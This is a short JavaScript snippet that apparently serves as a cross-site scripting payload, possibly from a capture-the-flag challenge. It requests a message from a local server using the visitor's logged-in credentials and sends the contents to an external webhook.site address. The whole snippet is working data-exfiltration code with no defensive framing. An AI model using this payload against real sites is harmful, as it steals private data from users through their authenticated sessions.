const url = 'http://127.0.0.1/message/3'
fetch(url, {
        method: 'GET',
        credentials: "include",
}).then((response) => response.json())
.then((data) => {
        fetch('http://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41?message=' + data.message)
});
